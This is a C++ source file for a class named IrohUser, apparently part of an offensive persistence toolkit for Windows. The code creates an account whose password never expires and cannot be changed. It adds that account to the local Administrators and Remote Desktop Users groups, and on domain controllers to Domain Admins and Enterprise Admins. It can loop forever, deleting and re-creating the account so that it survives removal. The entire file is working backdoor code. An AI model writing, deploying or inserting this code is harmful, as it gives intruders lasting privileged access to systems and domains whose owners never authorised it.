#include "User.h"
#include "../Utilities/StringUtilities.h"

namespace Iroh {

	IrohUser::IrohUser() : username(DEFAULT_USERNAME), password(DEFAULT_PASSWORD), sleepTime(DEFAULT_SLEEPTIMER)
	{ /* No functionality here */ }

	VOID IrohUser::SetUsername(std::string newUsername) {
		this->username = Utilities::StringUtilities::strtowstr(newUsername);
	}

	VOID IrohUser::SetPassword(std::string newPassword) {
		this->password = Utilities::StringUtilities::strtowstr(newPassword);
	}
	
	VOID IrohUser::SetSleepTime(INT timeInMilli) {
		this->sleepTime = timeInMilli;
	}

	VOID IrohUser::Start() {
		
		if (this->sleepTime == 0)
			this->CreatePersistentUser();
		else {
			this->UserLoop();
		}
	}

	VOID IrohUser::UserLoop(){
		
		while (TRUE) {
			this->CreatePersistentUser();
			Sleep(this->sleepTime);
		}

	}

	VOID IrohUser::CreatePersistentUser() {
		//
		// Set up variables
		// 
		std::wstring domainName;

		// User Variables
		USER_INFO_1 ui;
		USER_INFO_1 buf;
		DWORD dwlevel = 1;
		DWORD errorLevel = 0;
		NET_API_STATUS status;

		// Group Variables
		DWORD gpLevel = 3;
		DWORD entryCount = 1;
		LOCALGROUP_MEMBERS_INFO_3 localGroupInfo;
		std::wstring enterpriseGroup(L"Enterprise Admins");
		std::wstring domainGroup(L"Domain Admins");
		std::wstring RDPGroup(L"Remote Desktop Users");
		std::wstring localAdminGroup(L"Administrators");

		// Set up the User Info Struct
		ui.usri1_name = (LPWSTR)this->username.c_str();
		ui.usri1_password = (LPWSTR)this->password.c_str();
		ui.usri1_priv = USER_PRIV_USER;
		ui.usri1_home_dir = NULL;
		ui.usri1_comment = NULL;
		ui.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD | UF_PASSWD_CANT_CHANGE;
		ui.usri1_script_path = NULL;

		// Set up the local group domain name
		localGroupInfo.lgrmi3_domainandname = (LPWSTR)this->username.c_str();

		// Get Domain 
		domainName = GetDomainName();

		//
		// Delete the user so that it can be recreated incase the password is changed.
		//
		if ((status = NetUserGetInfo(NULL, (LPWSTR)this->username.c_str(), dwlevel, (LPBYTE*)&buf)) == NERR_Success) {
			if (IrohUser::IsDomainController())
				NetUserDel((LPCWSTR)domainName.c_str(), (LPCWSTR)this->username.c_str());
			else
				NetUserDel(NULL, (LPCWSTR)this->username.c_str());

		}

		//
		// Add the user back to the computer
		//	
		if (IrohUser::IsDomainController())
			NetUserAdd((LPCWSTR)domainName.c_str(), dwlevel, (LPBYTE)&ui, &errorLevel);
		else
			NetUserAdd(NULL, dwlevel, (LPBYTE)&ui, &errorLevel);

		//
		// Add the user to groups
		//
		localGroupInfo.lgrmi3_domainandname = (LPWSTR)this->username.c_str();

		if (IrohUser::IsDomainController()) {
			NetGroupAddUser((LPCWSTR)domainName.c_str(), (LPWSTR)enterpriseGroup.c_str(), (LPCWSTR)this->username.c_str());
			NetGroupAddUser((LPCWSTR)domainName.c_str(), (LPWSTR)domainGroup.c_str(), (LPCWSTR)this->username.c_str());
			NetLocalGroupAddMembers((LPCWSTR)domainName.c_str(), (LPWSTR)localAdminGroup.c_str(), gpLevel, (LPBYTE)&localGroupInfo, entryCount);
			NetLocalGroupAddMembers((LPCWSTR)domainName.c_str(), (LPWSTR)RDPGroup.c_str(), gpLevel, (LPBYTE)&localGroupInfo, entryCount);
		}
		else {
			NetLocalGroupAddMembers(NULL, (LPWSTR)localAdminGroup.c_str(), gpLevel, (LPBYTE)&localGroupInfo, entryCount);
			NetLocalGroupAddMembers(NULL, (LPWSTR)RDPGroup.c_str(), gpLevel, (LPBYTE)&localGroupInfo, entryCount);
		}
	}

	BOOL IrohUser::IsDomainController() {
		DSROLE_PRIMARY_DOMAIN_INFO_BASIC* domainInfo;

		if (DsRoleGetPrimaryDomainInformation(
			NULL,
			DsRolePrimaryDomainInfoBasic,
			(PBYTE*)&domainInfo)
			!= ERROR_SUCCESS) {
			return NULL;
		}

		if (domainInfo->MachineRole == DsRole_RolePrimaryDomainController ||
			domainInfo->MachineRole == DsRole_RoleBackupDomainController)
			return TRUE;
		else
			return FALSE;

	}

	std::wstring IrohUser::GetDomainName() {

		DSROLE_PRIMARY_DOMAIN_INFO_BASIC* domainInfo;

		if (DsRoleGetPrimaryDomainInformation(
			NULL,
			DsRolePrimaryDomainInfoBasic,
			(PBYTE*)&domainInfo)
			!= ERROR_SUCCESS) {
			return L"";
		}

		if (domainInfo->DomainNameDns == NULL)
			return L"";
		else
			return domainInfo->DomainNameDns;

	}

}